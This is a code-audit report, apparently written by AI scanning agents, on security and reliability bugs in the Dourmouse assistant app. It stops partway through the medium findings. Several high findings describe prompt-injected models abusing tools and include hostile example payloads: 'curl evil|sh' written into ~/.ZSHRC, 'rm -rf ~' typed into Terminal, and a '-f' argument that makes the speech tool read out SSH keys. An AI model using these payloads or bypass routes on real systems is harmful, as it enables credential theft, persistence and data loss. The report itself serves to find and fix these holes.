# Dourmouse code issues: full read-through (2026-10-06, commit eba68c7)

How this was made: six read-only Sonnet scanners each read every line of one group of files (A: webui, config, request guard, Google auth, all Electron; P2: dispatch, roster, planner, prompts, router, policy; P3, P4, P5: every other Python module; U1: half of the UI). Each finding was verified by its scanner against the surrounding code and callers; many were reproduced with small isolated checks. The main thread re-checked the high findings P4-8, P3-8, P3-67, P2-13, P5-65 and P5-1 against the code and found them real. Per-group raw notes: `scan/<group>_findings.md`.

NOT READ (budget): group U2, 72 UI files (about 23,100 lines), listed in `scan/U2_files.txt`. Run it later with the same prompt (`scan/FULL_SCAN_PROMPT.md`).

## Totals

288 findings: 0 critical, 8 high, 119 medium, 161 low.
By group: A 23, P2 31, P3 70, P4 67, P5 70, U1 27.

## The 8 high findings, in plain words

1. P4-8: `browser_press`, and `browser_submit` / `browser_signin` in some paths, always fail: Playwright's `Keyboard.press` has no `timeout` argument (`browser_agent.py:1541, 1573, 2017`). Confirmed against the installed Playwright signature.
2. P3-8: if building the MCP config raises, the Claude CLI still runs with `--permission-mode bypassPermissions` but without `--disallowedTools` (`code_backends.py:513, 886`). Confirmed.
3. P3-67: `/api/speech?text=-f/path` makes macOS `say` read any local file and return it as audio; the text is passed with no `--` (`voice.py:342`). Reproduced by the scanner.
4. P2-13: workspace file tools compare protected folder names case-sensitively on a case-insensitive disk, so `Self_Extensions/` gets past the guard on `self_extensions/` (`general_roster.py:1279`). Reproduced.
5. P5-65: the same case problem in the ungated-write protection for startup files and code (`~/.ZSHRC`, `.GIT/hooks`, `.ENV`) (`system_access.py:424`). Reproduced.
6. P5-1: the Accessibility fast path for app control never checks the app blocklist, so Terminal or Keychain could be typed into once Accessibility is granted.
7. P3-37: `mobile_link --rotate` never writes the new token or host, while printing that it did. Reproduced.
8. P5-40: the scheduled 08:30 daily briefing fires on about 3 percent of days (the loop sleeps past the target and then schedules tomorrow). Simulated.

## Already known and recorded elsewhere (not repeated below)

CDP port 9333 trusts any local process; Send-button clicks are not gated; the start-up burst of about 50 threads; five self-contained build blockers (SHIP_PLAN.md); extensions global across profiles; Chrome History import has no timeout; log rotation only at open; host.openExternal returns true without awaiting; Undo on Clear can drop newer notices; 13 open and 28 partly fixed UX items (UX_ISSUES_2026-09-27.md); calendar, files and notes screens need backend routes.

## Mechanical scan highlights (scan/MECHANICAL_SCAN.md)

489 ruff findings (mostly style); 158 `except ...: pass` in non-test Python; 4 SQL strings built by formatting (shared_rag.py, office_logger.py); a loop-variable closure in atlas_lab.py:303; scripts/live_typer.py uses three undefined names.

## All findings, by severity

### P2-13 [high] Protected-path checks in the workspace file tools are case-sensitive on a case-insensitive filesystem
- where: dourmouse/general_roster.py:1276 (also :1372)
- problem: `_refuse_protected` and `_is_secret_workspace_path` compare `parts[0]` to lowercase names (`self_extensions`, `auth`, `state`, ...). `_safe_resolve` keeps the caller's case, and the default macOS APFS volume (this Mac) is case-insensitive, so `Self_Extensions/...` is the same folder but is not refused. Finding #137's guard ("never write here") and #157 R2B-06 ("never read the auth folder") are bypassed.
- evidence: write_file path "Self_Extensions/drafts.jsonl" wrote into the real `self_extensions/` folder (tested with DOURMOUSE_WORKSPACE=/tmp/p2ws), while "self_extensions/a.txt" was REFUSED
- scenario: a model driven by hostile page text edits `Self_Extensions/drafts.jsonl` (not matched by the file-name regex) and drops a module in `Self_Extensions/approved/`; the loader trusts the recorded sha256 in that store, so code runs at the next server start. The same trick reads non-.db files under `Auth/`, and writes `State/`, `Security/`, `Sessions/`.
- fix: compare `parts[0].lower()` (and use `os.path.normcase`/samefile semantics) in both functions; better, resolve case-insensitively against the real directory listing.

### P3-37 [high] mobile_link write_env never writes a changed host or token, so --rotate silently does nothing while the CLI claims it did
- where: dourmouse/mobile_link.py:107-137, 291-297
- problem: when DOURMOUSE_HOST or DOURMOUSE_ACCESS_TOKEN already exist with a different value, the loop replaces the line in `out_lines`, and the later "detect in-place value changes" check tests `target not in out_lines`, which is now false because the replacement just inserted it. `changed` stays False and the file is not written. `main` still prints "[ENV] DOURMOUSE_ACCESS_TOKEN written to .env" and shows the new token on the QR page.
- evidence: verified: with an .env containing HOST=127.0.0.1 and TOKEN=old, `write_env("0.0.0.0","new")` returns `{'changed': False ...}` and the file is unchanged.
- scenario: the owner runs `python -m dourmouse.mobile_link --rotate` after a token leak; the old token keeps working, the printed new token is rejected by the gate, and a host left at 127.0.0.1 is never widened. The security guidance ("Rotate with --rotate") is a no-op.
- fix: track `changed = True` whenever a replaced line differed from the target, and write the file when it is set; also chmod the written .env to 0o600.

### P3-67 [high] _say_speak passes user text to `say` as an option-capable argument, so text like "-f/path" makes TTS read any local file and return it as audio
- where: dourmouse/voice.py:327-357 (reachable from dourmouse/webui.py:4186-4210 GET /api/speech?text=, hands_free, chimes)
- problem: the command is `["say", "-o", out, "--data-format=LEI16@22050", safe]` with no `--` separator. `say` parses an argument starting with "-" as options, so the text `-f/Users/x/.ssh/id_rsa` is treated as `-f <file>`: the file's contents are synthesised, and the WAV is returned to the HTTP caller. A text of `-o/some/path` would likewise redirect the output file (the later -o wins) and create or truncate an arbitrary file the user can write. The 500-character cap applies to the argument, not to the file read. The `[[...]]` neutralisation in the docstring covers only embedded commands.
- evidence: verified on this Mac: `say -o a.wav --data-format=LEI16@22050 "-f/tmp/p3say/secret.txt"` produced a 1.2 MB WAV of the file's spoken contents, versus 4 KB for the same call with a non-file argument.
- scenario: any caller of GET /api/speech (loopback requests are exempt from the token; a phone with the token also qualifies), or a prompt-injected reply spoken by the chime/hands-free path, requests `?text=-f/Users/<name>/.ssh/id_rsa` and receives the key material as audio that can be transcribed.
- fix: pass the text through stdin (`say -f -`) or put `--` before it, and reject text beginning with "-".

### P3-8 [high] Claude CLI runs with bypassPermissions and the native-tool deny list is silently dropped if the MCP config step raises
- where: dourmouse/code_backends.py:513-525 (and 885-895 in stream_claude)
- problem: `--disallowedTools Bash,Write,Edit,...` (finding #157's control), `--strict-mcp-config` and `--allowedTools` are built in the same try block as `_ensure_mcp_config_path()`. Any exception there (unwritable config dir, mcp_bridge import error, JSON/OS error) is swallowed and `mcp_args = []`. `--permission-mode bypassPermissions` stays in the argv unconditionally, so the CLI then runs with ungated Bash/Write/Edit and the user's own claude.ai connectors.
- evidence: `except Exception:  # noqa: BLE001 - best-effort: a broken MCP config must`
- scenario: ~/Library/.../mcp-config.json cannot be written (read-only volume, disk full, import failure); every CODE-screen and Claude-front turn then executes native Bash with all permission checks bypassed and no secret scrubbing, with no log line.
- fix: build the deny-list and settings args outside the try; if the MCP config fails, keep `--disallowedTools` (or refuse to run with bypassPermissions) and surface the error.

### P4-8 [high] browser_press, browser_submit (focused field) and browser_signin (no submit button) always fail: Keyboard.press has no `timeout` argument
- where: dourmouse/browser_agent.py:1541, 1573, 2017
- problem: Playwright's `Keyboard.press(key, *, delay=None)` takes no `timeout`. Passing `timeout=8_000` raises TypeError, which the handlers wrap as "BROWSER PRESS FAILED: TypeError ..." (press) or let propagate (submit, signin).
- evidence: `await page.keyboard.press(key, timeout=8_000)` (verified with inspect.signature on the repo's .venv Playwright: "got an unexpected keyword argument 'timeout'")
- scenario: the model types into a search or login field and calls browser_submit (the common case: focus is an INPUT, so the Enter branch runs): the tool errors every time, after the owner already approved the confirmation prompt; browser_press Enter/Tab/Escape never works at all; browser_signin with a form that has no matching submit button fails after the password was already typed into the field.
- fix: drop `timeout=` (use `page.keyboard.press(key)` inside `asyncio.wait_for`, or `page.press(selector, key, timeout=...)`).

### P5-1 [high] AX app-control fast path bypasses the app blocklist entirely
- where: dourmouse/app_control_ax.py:191 (also 217, 314, 367, 411); caller dourmouse/general_roster.py:1001-1100
- problem: app_control.py refuses Terminal, iTerm, Keychain Access, Passwords, Finder, System Settings, Script Editor via _check_not_blocked, and its docstring says "regardless of confirmation". None of activate_app_fast, quit_app_fast, click_menu_item_ax, press_key_ax or send_keystrokes_ax call it. general_roster always tries the AX path first (quit/activate unconditionally, keystroke/press_key whenever AX trust is held), so the blocklist only applies to the AppleScript fallback.
- evidence: `_apps_quit_tool` -> `return app_control_ax.quit_app_fast(app_name, dry_run=dry_run)` with no blocklist call
- scenario: once Accessibility is granted, a model/prompt-injected tool call send_app_keystrokes(app_name="Terminal", text="rm -rf ~\n") types into Terminal; quit_app("Finder") or press_key into "Passwords" also go through.
- fix: call app_control._check_not_blocked(app_name) at the top of every *_fast/*_ax function (or in the general_roster handlers before choosing a backend).

### P5-40 [high] The scheduled 08:30 daily briefing almost never fires (about 3% of days)
- where: dourmouse/report.py:244-260
- problem: _loop waits 1s, computes `_seconds_until(target, now)` and, when more than 1s remains, sleeps `min(wait, 30)` and loops. It only fires if a sample lands in the last second before the target. A sample with 1 < wait <= 30 sleeps `wait` and then the loop-top `wait(1)` pushes the clock past the target, so the next `_seconds_until` returns tomorrow (target <= now -> +1 day) and no fire happens. With one sample every ~31s, only ~1 day in 31 lands in the 1s window (simulated: 3.1% of random start offsets fire).
- evidence: `if wait > 1:` / `self._stop.wait(min(wait, 30))` / `continue` before the only `self._fire()`
- scenario: DOURMOUSE_REPORT=1 (default), app left running overnight: no 08:30 briefing on the feed/bus; only the launch-time brief-on-open ever appears.
- fix: remember the next fire datetime once, loop with short waits until `clock() >= next_fire`, fire, then advance next_fire by a day (and fire if now is within a tolerance after the target).

### P5-65 [high] The ungated-write protection list is case-sensitive, so ~/.ZSHRC, ~/Library/LaunchAgents spelled in another case, <repo>/DOURMOUSE/, .GIT/hooks and .ENV bypass it on macOS
- where: dourmouse/system_access.py:404-439 (used by _write_path_tool 462, _apply_patch_tool 358, _apply_search_replace_tool 330)
- problem: write_path, apply_patch and apply_search_replace are deliberately ungated and rely on _protected_target_reason to refuse files that RUN later (shell start-up files, LaunchAgents, git hooks, Dourmouse's own code, .env, workspace secrets). It compares `path.name in _STARTUP_FILES`, `".git" in path.parts`, `_under_dir(path, root / "dourmouse")`, `home / "Library/LaunchAgents"` and `path == root / ".env"` with exact case. The default macOS volume is case-insensitive and Path.resolve() does not normalise case, so `~/.ZSHRC` is the same file as `~/.zshrc` but passes. (_is_sensitive was already fixed for this with casefold at lines 212-215; this function was not.) Verified: on this Mac `Path("/tmp/x/.ZSHRC").exists()` is True for an existing `.zshrc` and `.resolve().name in {".zshrc"}` is False.
- evidence: `if path.parent == home and path.name in _STARTUP_FILES:`
- scenario: a prompt-injected model calls write_path(path="~/.ZSHRC", content="curl evil|sh") (or ~/Library/LaunchAgents spelled "~/LIBRARY/launchagents/x.plist", or "<repo>/DOURMOUSE/dispatch.py"): the write succeeds with no approval and the payload runs at the next shell login / launchd load / app start.
- fix: casefold both sides in every comparison (names, parts, directory prefixes) or compare via os.path.samefile / realpath of the existing parent, and apply the same fold to _SYSTEM_DIRS and _STARTUP_DIRS.

### A-1 [medium] Dock "activate" never recreates the console window (hidden windows count) and the recreated one lacks wiring
- where: electron/main.js:3718
- problem: `app.on("activate")` only builds a new main window when `BrowserWindow.getAllWindows().length === 0`. The hidden map window (line 3682) and the hidden ATLAS lab window (line 3697) are created at launch and stay alive, and getAllWindows includes hidden windows, so the count is never 0 after the owner closes the console. The branch that would run also skips the `resize` handler (so the pane BrowserView stops following the window), skips the saved geometry, and never re-attaches the active pane view to the new window.
- evidence: `if (BrowserWindow.getAllWindows().length === 0) {`
- scenario: Owner closes the console window with the red button (window-all-closed deliberately does not quit), then clicks the Dock icon: nothing opens; the app is running with no visible window until it is quit from the tray. If the branch ever does run (map and atlas windows closed by hand), the pane is mis-sized after the first resize.
- fix: Test for a live, visible main window instead (`!mainWindow || mainWindow.isDestroyed()`), and share one `createMainWindow()` used by both start-up and activate so recovery, resize, geometry and pane re-attach are identical.

### A-13 [medium] load_ollama_config(force_local=True) no longer forces local, so "local-only" agents (mail, docs, study) send private content to Ollama Cloud
- where: dourmouse/config.py:649 (docstring at 598-612; callers dispatch.py:2432, 2502, webui.py:5636)
- problem: The docstring says `force_local=True` is "always local, always keyless, regardless of what's in the environment", and dispatch.py swaps it in for every agent in `model_delegation._LOCAL_ONLY_AGENTS` so mail/docs/study "never leave the machine". The code now only goes local when no key exists: `if force_local and not api_key:`. With OLLAMA_API_KEY set it falls through to the cloud branch and returns `is_cloud=True`, `base_url=https://ollama.com/v1`.
- evidence: `if force_local and not api_key:`
- scenario: A user with an Ollama Cloud key asks the mail or docs agent about an email or Drive document; the content goes to ollama.com although the agent is registered as local-only and the config docstring and dispatch comments promise otherwise. (A 2026-09-14 comment in the function says this was user-directed for models, but it was applied to the privacy pin as well and the contract text was not updated.)
- fix: Either restore the unconditional local branch for `_LOCAL_ONLY_AGENTS` (and use a separate "cloud only" rule for other agents), or rename and re-document the parameter and the `_LOCAL_ONLY_AGENTS` contract and surface the cloud routing in the UI for those agents.

### A-14 [medium] Settings writers cannot round-trip the config file: an `export KEY=...` line makes every save fail, and values containing " #" are silently truncated
- where: dourmouse/config.py:1021 (_read_user_config_file) and env_lines at :100
- problem: `_read_user_config_file` splits on the first `=` without understanding python-dotenv syntax (which the same file is loaded with). A hand-added `export FOO=bar` becomes key `export FOO`, which `env_lines` rejects, so `save_orchestrator_model_setting`, `save_grounded_mode_setting`, `save_auto_approve_setting`, `save_api_key_setting` and the others all return `ok: False` until the line is removed. In the other direction, `env_lines` writes values raw, and dotenv drops an unquoted value from ` #` onward, so a saved key containing whitespace plus `#` is stored truncated (and values starting with a quote or containing `${...}` are re-interpreted).
- evidence: `values[k.strip()] = v.strip()`
- scenario: Verified in /tmp: with `export FOO=bar` in the file, `save_grounded_mode_setting(True)` returns `could not write config: 'export FOO' is not a valid setting name`; `save_api_key_setting("GEMINI_API_KEY","ab #cd")` reports saved but `dotenv_values` yields `ab`.
- fix: Read the file with `dotenv_values`, and have env_lines quote values that contain `#`, `$`, quotes or leading/trailing space (or refuse them).

### A-16 [medium] force_backend=freellmapi swaps the shared session's client and config outside the lock, and early returns never restore them
- where: dourmouse/webui.py:5683 (swap), 5711 / 5733 / 5748 (early returns), 5849 (the only restore)
- problem: `_handle_chat_authed` captures `previous_client`/`previous_config` and replaces `session.client` and `session.config` with FreeLLMAPI objects before it takes `session_lock`, and the restore sits in the `finally` of the later `with session_lock:` block. Three returns happen between the two: the `code_claude` passthrough, the slash-command / All-Hands branch, and the "just say send" owner intercept. A request that sets `force_backend: "freellmapi"` and hits any of them leaves the session on the FreeLLMAPI client for good. Separately, because the swap is outside the lock, a second request (or a concurrent turn already running under the lock on the same session) sees the swapped client mid-turn, and a second freellmapi request captures the already-swapped client as its "previous" and restores to it.
- evidence: `session.client = OpenAI(api_key=freellmapi_cfg.api_key or "no-key-configured",`
- scenario: The composer is set to DIRECTIVE VIA FreeLLMAPI and the user types `/claude ...`, or `yes` while a confirmation is pending: that turn returns early, and every later turn on the tab (and the default session) goes to the local FreeLLMAPI endpoint with the Ollama model names, failing with 404s until the server restarts.
- fix: Do the swap and the restore together inside `with session_lock:` using try/finally, and only for the branch that actually calls `session.ask`.

### A-17 [medium] The /api/events stream is closed after 60 idle seconds, so Electron alert notifications stop for the rest of the session
- where: dourmouse/webui.py:2090 (`timeout = 60`) and :6137 (`self.rfile.read(1024)` in `_handle_events`); electron/main.js:3493
- problem: `_Handler.timeout = 60` sets a 60 s socket timeout on every connection. `_handle_events` holds the SSE connection open by blocking on `self.rfile.read(1024)`; the client never sends anything after its request, so the read raises a timeout (an OSError) after 60 s, which the loop treats as a disconnect: the stream is unregistered and the connection closed. The server sends no keep-alive and the handler ignores that the comment on `timeout` says a busy handler "touches no socket".
- evidence: `chunk = self.rfile.read(1024)`
- scenario: Verified the socket semantics with a socketpair (a timed-out buffered read raises OSError after the timeout). A browser EventSource reconnects and loses events in the gap; the Electron shell's `startAlertNotifications` uses a plain `http.get` that only logs "stream ended", so native alert notifications stop about a minute after launch and are never re-established except after a server restart.
- fix: In `_handle_events` set `self.connection.settimeout(None)` and send a comment line (`: ping`) every 15-25 s from the hub; in main.js reconnect when the stream ends.

### A-2 [medium] Console STUDY and PROJECT buttons feature-detect bridge methods the Electron preload never exposes, and the fallback is denied
- where: electron/preload.js:17 (and ui/console.html:1757, 2003)
- problem: ui/console.html calls `window.pywebview.api.open_study()` / `open_project()` when present and otherwise `window.open("/study", "_blank", "noopener")`. preload.js exposes only open_agent, open_all_hands and open_external, and main.js has no `bridge:open_study` or `bridge:open_project` handler. In the Electron shell the fallback `window.open` reaches `lockToAppOrigin`'s window-open handler, which returns `{ action: "deny" }` for every URL, including allowed same-origin ones (only disallowed URLs are handed to the OS).
- evidence: `wc.setWindowOpenHandler(({ url }) => { if (!policy.navigationAllowed(url, PORT)) sendOut(url); return { action: "deny" };`
- scenario: In the default Electron shell the STUDY entry in the console tab menu does nothing (the exact failure fixed earlier for pywebview on 2026-09-14). PROJECT open silently falls back to the same-tab swap instead of the dedicated window the code comment promises.
- fix: Add `bridge:open_study` and `bridge:open_project` handlers (via openTaskWindow) and expose them in preload.js, or make the window-open handler open same-origin URLs in a task window instead of denying them.

### A-20 [medium] Google sign-in "claim" bridge: caller-chosen claim code plus a pre-auth redeem route lets another party collect the owner's session
- where: dourmouse/webui.py:6355 (claim chosen in /api/auth/google/start), 6453 (parked), 6502 (/api/auth/claim, pre-auth)
- problem: `GET /api/auth/google/start?claim=CODE` stores whatever CODE the caller gives, and the callback (which is not bound to the browser that started the flow; `state` lives only server-side) parks the completed Google session under that code. `GET /api/auth/claim?code=CODE` is answered before `_authorized()` and returns a `dourmouse_user_session` cookie for it. A valid Google user session is accepted by `_authorized()` as full access (even off-loopback and in place of the access token) and is what the Google tools act as.
- evidence: `claim = (qs.get("claim") or [""])[0].strip() or None`
- scenario: A web page sends the owner's browser to `http://127.0.0.1:8765/api/auth/google/start?claim=attacker-value` (a plain GET; the Host guard passes). If the owner picks their account on the Google screen, the session is parked under the attacker's code; anyone who can reach the server (a LAN or Tailscale client on a token-gated install, or a local process) redeems it at /api/auth/claim with no token and holds the owner's session.
- fix: Generate the claim code server-side and return it to the requester, bind it to a secret held by the app window, and refuse caller-chosen codes; or make /api/auth/claim require the owner proof.

### A-3 [medium] Google token refresh wipes the signed-in user's name, picture and sub
- where: dourmouse/google_auth.py:652
- problem: `access_token_for` persists the refreshed tokens with `self.upsert_user(email, merged)`. `upsert_user` has `name=""`, `picture=""`, `sub=""` defaults and its ON CONFLICT clause sets `name=excluded.name, picture=excluded.picture, sub=excluded.sub`, so every refresh overwrites those columns with empty strings.
- evidence: `self.upsert_user(email, merged)`
- scenario: Verified in /tmp with an in-memory AuthStore: profile is `{'name': 'Ann', 'picture': 'p'}` after login and `{'name': '', 'picture': ''}` after the first hourly token refresh, so the UI loses the display name and avatar and `sub` is lost.
- fix: Make the refresh path update only the tokens column (or have upsert preserve existing non-empty values with `COALESCE(NULLIF(excluded.name,''), users.name)`).

### P2-14 [medium] Every build_general_registry() call starts the configured external MCP servers again and never closes them
- where: dourmouse/general_roster.py:6681 (callers: general_roster.py:2520 and :2611, dourmouse/model_delegation.py:271, dourmouse/model_context.py:41, dourmouse/self_extensions.py:469, dourmouse/orch_net.py:858)
- problem: `_mcp_subagent, _mcp_clients = build_external_mcp_subagent()` starts one subprocess per server in mcp_servers.json and the returned client list is thrown away, so nothing can `close()` it. The builder is called per delegated task (`model_delegation`, one registry per task), per `schedule_recurring`, per `draft_tool`, per approval and per briefing, and each call also re-`exec`s every approved self-extension module.
- evidence: `_mcp_subagent, _mcp_clients = build_external_mcp_subagent()` with `_mcp_clients` never used again
- scenario: with one MCP server configured, a 12-task delegate_to_models fan-out starts 12 extra server processes (and 12 handshakes) that stay alive until the app exits, plus the same for every schedule or briefing build; descriptors, memory and any server-side side effects pile up.
- fix: build the registry once and reuse it (pass it to the callers), or cache `build_external_mcp_subagent()` at module level and close it at shutdown.

### P2-2 [medium] Live Harmony filter drops the rest of a normal reply after any literal "<|"
- where: dourmouse/dispatch.py:1883
- problem: after the first "<|" `_HarmonyDeltaFilter` leaves scanning mode permanently; a non-marker "<|" (F#/Elm/Haskell pipe, shell example) is held, then dropped because `_channel` is None, and all later text is dropped too. The comment says it will "treat the leading '<' as content", but it only emits when channel == "final". `finish()` also discards the buffer.
- evidence: feeding ["In F# you pipe with ", "x <| f", " and then continue ...", " More text."] emits only 'In F# you pipe with x '
- scenario: a coding answer containing `<|` is cut off on screen with no error; the stream is the only thing the UI shows (no later re-render), so the user sees a truncated answer while the stored text is complete.
- fix: when a "<|" is not a Harmony marker (buffer over 64 chars or no marker match), emit the text when `_channel is None` and go back to scanning mode.

### P2-22 [medium] Planner routes "message ... agent" requests to messenger, but send_message refuses every call outside a delegated single-agent run
- where: dourmouse/planner.py:372 (compound_agent_message boost) with dourmouse/general_roster.py:1816
- problem: the planner deliberately boosts `messenger` for "send a message to the research agent" at the top level. `send_message` takes the sender from `ctx.forced_agent` and returns REFUSED when it is None; a plan-routed top-level turn has `forced_agent=None` (it is set only by delegate_task/delegate_parallel branches and pinned screens). The messenger prompt (agent_prompts.py "messenger") tells the model to call send_message for any request and says no confirmation is needed.
- evidence: `real_agent = ctx.forced_agent if ctx is not None else None` / `if not real_agent: return "REFUSED: send_message needs a real, single-agent caller identity ..."`
- scenario: user types "send a message to the markets agent saying X" in a normal chat; messenger is scoped, the model calls send_message, gets REFUSED, and the user is told it cannot be done although the routing fix was added so that this works.
- fix: either let a plan-routed single-agent turn count as `messenger` identity (set forced_agent from plan_agents when exactly one agent) or have the planner route to `orchestrator`/delegate_task for this phrasing.

### P2-23 [medium] mail prompt tells the model to use email_own_send as an "is this my address" checker; it sends mail
- where: dourmouse/agent_prompts.py:4138 and :4155
- problem: the prompt says `[email_own_send] -> use for [checking whether a specified email address belongs to the user's own account]` and decision rule 12 says to call it when determining whether an address is the user's own. The real tool sends an email from Dourmouse's SMTP identity (needs to, subject, body; confirmation gated).
- evidence: `[email_own_send] → use for [checking whether a specified email address belongs to the user's own account when relevant].`
- scenario: asked "is x@y.com mine?", the model calls email_own_send with invented subject/body to "check"; the owner sees a send-mail approval, and approving it emails x@y.com.
- fix: describe it as a send tool; use `email_identity_status` for the identity check.

### P2-3 [medium] A transient error mid-stream is retried and the already-shown text is streamed again
- where: dourmouse/dispatch.py:884
- problem: `_call_with_retry_inner_impl` retries `_stream_completion` on a transient error (ConnectionError, timeout, 5xx after first bytes). Deltas of the failed attempt were already sent through `on_delta`; the retry emits the full answer again, and no "reset" event exists.
- evidence: `return _stream_completion(client, model, messages, tools, extra_body, on_delta, on_thinking)` inside the retry `while True`
- scenario: Ollama Cloud drops the connection after 300 chars; the retry succeeds; the chat bubble shows the first 300 chars twice (assistant_delta is what the UI keeps).
- fix: emit a "stream_reset" event before a retry (UI clears the bubble), or only retry when nothing was emitted yet.

### P2-4 [medium] Tool-call exceptions write the raw arguments to logs/errors.log
- where: dourmouse/dispatch.py:3124
- problem: on any handler exception `obs.log_error(..., extra={"arguments": arguments})` and `detail=traceback.format_exc()` are written unredacted. obs.py has no DLP. execution_policy.py explicitly never logs raw arguments "because they can hold credentials", and governance promises secrets never reach the audit record.
- evidence: `extra={"arguments": arguments},`
- scenario: browser_fill/browser_type with a password, gmail_send with a body, or write_note with a pasted key fails (network error, timeout); the secret sits in plain text in logs/errors.log (5 MB, 2 rotated copies) outside any DLP.
- fix: log only argument names and a hash (reuse `execution_policy._args_fingerprint`) and pass the traceback through `DlpFilter().redact`.

### P2-5 [medium] A model tool call whose arguments parse to a non-object crashes the whole turn
- where: dourmouse/dispatch.py:5591
- problem: `json.loads(arguments)` can return null, a list, a string or a number; `validate_tool_arguments` then does `arguments.items()` / `required not in arguments` and raises AttributeError/TypeError. Nothing in `_run_dispatch_loop` catches it (only JSONDecodeError is handled), contradicting the module docstring "malformed arguments produce error text, not crashes".
- evidence: `validate_tool_arguments({"properties":{}}, None)` -> AttributeError 'NoneType' object has no attribute 'items'
- scenario: a model sends `"null"` or `"[]"` as arguments for a zero-argument tool; the whole turn aborts, the user loses the reply and the partial exchange.
- fix: after json.loads, `if not isinstance(arguments, dict): result_text = "ERROR: tool arguments must be a JSON object"` (null -> `{}`).

### P2-6 [medium] Account rotation never marks or skips the account that actually failed first
- where: dourmouse/dispatch.py:2372
- problem: the initial client is built from the config key (`_build_client`), not from the pool. `factory()` starts with `state["current"] = None`, so on the first rate limit nothing is marked cooling and `pool.select()` can hand back the same exhausted account (cursor 0 = account 1). The cooldown never records the initial account, so the next turn starts on it again.
- evidence: `previous = state["current"]` / `if previous is not None: pool.mark_rate_limited(previous.name)`
- scenario: NVIDIA_API_KEY and NVIDIA_API_KEY_2 set, key 1 rate limited: first rotation returns key 1 again (one wasted backoff sleep), every new turn begins on key 1 again, so the multi-account feature only helps after a second failure.
- fix: identify the initial account (match the client's key against the pool) and mark it before selecting; build the first client from `pool.select()`.

### P2-7 [medium] open_url has no scheme check and the argument gate skips every non-http form, contradicting "the tool itself refuses"
- where: dourmouse/general_roster.py:747 (gate at dourmouse/dispatch.py:2872)
- problem: `_open_url_tool` passes any string to `webbrowser.open`. `_url_gate` returns None for a non-http scheme or a missing hostname ("the tool itself refuses a malformed address" is only true for browser_open and open_browser_pane, which call `_is_http_url`). So `file:///...`, `smb://...`, custom app schemes, `localhost:8765/x`, `//127.0.0.1:8765/` and `http:127.0.0.1:8765` all skip the own-port refusal and the internal-address confirmation.
- evidence: `_url_gate("open_url", "http:127.0.0.1:8765", "")` -> None, while `http://127.0.0.1:8765` -> refuse
- scenario: injected page text makes the model call open_url on `http:127.0.0.1:8765/...` (browsers read it as http://127.0.0.1:8765); the owner sees a plain "Open ... in your browser?" prompt with no internal-address warning and no refusal. Non-http schemes (file, smb, vnc, app handlers) can be launched the same way.
- fix: in `_open_url_tool` require `_is_http_url`; in `_url_gate` refuse (not allow) any url that is not a plain http(s) URL with a hostname.

### P3-11 [medium] MCP-connection retry in _run_claude re-runs the whole task and reuses a --session-id that now exists
- where: dourmouse/code_backends.py:717-723
- problem: when the exit-0 output merely matches the "MCP server failed to connect" regex, the code re-runs the same task with the same `session_args`. (a) On a first turn those args are `--session-id <new id>`, and the first attempt already created that session; the CLI's own documented error for this (line 131) is "is already in use", and no fresh-session retry is applied to this second call, so a usable degraded answer is replaced by an exception. (b) On resumed sessions the retry repeats every tool call the first attempt completed. The regex also matches any answer that quotes those words.
- evidence: `if proc.returncode == 0 and _CLAUDE_MCP_CONNECTION_FAILED_RE.search(out):`
- scenario: a turn that already sent an email or wrote a file then mentions a failed MCP connection; the retry sends or writes it again.
- fix: on retry use `--resume` for the tracked id (or skip the retry when the first attempt reported tool use), and anchor the regex to the CLI's own wording.

### P3-17 [medium] The eval grader defaults to the same backend and model that answered, contradicting the module's own rule
- where: dourmouse/eval_harness.py:103-121 (docstrings at :9-12 and :104-106)
- problem: the header says "the model that answering must never be the model that grades", and `_grader_client_and_model` says it is "deliberately resolved separately". It calls the same `load_llm_config_with_fallback()` that the answering path uses and returns `config.model` unless DOURMOUSE_EVAL_GRADER_MODEL is set. By default the answerer grades itself, which is the self-grading bias the harness claims to prevent.
- evidence: `return client, (grader_model or config.model)`
- scenario: a quality run with no override reports scores graded by the same model on the same backend, and the logged results are compared across commits as if independent.
- fix: require DOURMOUSE_EVAL_GRADER_MODEL (or pick a different configured backend) and fail loudly or record `grader == answerer` in the result.

### P3-2 [medium] Harness embeds params as JSON text in Python source, so any true/false/null param crashes every run
- where: dourmouse/atlas/atlas_proposals.py:685 (params_json=json.dumps(params)) used at :564
- problem: `_HARNESS_TEMPLATE` pastes `json.dumps(params)` into Python source. JSON booleans and null are `true`/`false`/`null` (and NaN), which are NameErrors in Python. The call sits inside the harness try block, so the run is reported as "strategy code raised: name 'true' is not defined".
- evidence: verified with the template: `result = _sm.run(_load, {"a": true, "b": null})`
- scenario: the LLM schema asks for "any numeric/string params"; a proposal like {"use_filter": true} is approved and the local backtest always fails with a NameError that looks like a bug in the strategy, not the harness.
- fix: write params to a params.json file in work_dir and `json.load` it in the harness, or embed `repr(params)`.

### P3-20 [medium] freebuff_dispatch confirmation shows only 160 chars of a prompt that is up to 8000 chars
- where: dourmouse/freebuff_bridge.py:650-655 (cap at :149)
- problem: the human confirmation text is `prompt[:160]`, while the whole prompt (up to `_MAX_DISPATCH_CHARS` = 8000) is posted to an autonomous Freebuff agent working in a real project directory. The approval covers a fragment; anything after char 160 (including instructions the model appended or that came from injected content) runs without having been seen.
- evidence: `f"{(a.get('prompt') or '')[:160]!r}"`
- scenario: a prompt that begins with a harmless 160-char task description followed by "also delete ..." is approved on the preview alone.
- fix: show the full prompt (or at least refuse to dispatch prompts longer than what the confirmation displays).

### P3-22 [medium] poll_once marks a GDELT file as processed even when the download failed, so that 15-minute window is never retried
- where: dourmouse/gdelt_graph.py:334-351, 383-391
- problem: `fetch_gkg_records` returns `[]` for any URLError, timeout, OSError or BadZipFile. `poll_once` then ingests nothing but still sets `_last_processed_url = url`. The next poll sees the same URL in lastupdate.txt, takes the "already processed" branch (line 381) and skips it. The only trace is `_last_error = "fetched but parsed zero real records"`.
- evidence: `_last_processed_url = url` executes unconditionally after `records = fetch_gkg_records(url)`
- scenario: a 20s timeout or a half-downloaded zip on the one poll that sees a new file permanently drops that file's entities from the graph; the status line blames parsing, not the network.
- fix: only record the URL when `records` is non-empty (or when the fetch itself succeeded), and let fetch_gkg_records distinguish failure from an empty file.

### P3-24 [medium] A task left in VERIFYING by a crash is never recovered and can wedge or mislabel its goal
- where: dourmouse/goal_runtime.py:159-182, 198-209, 288
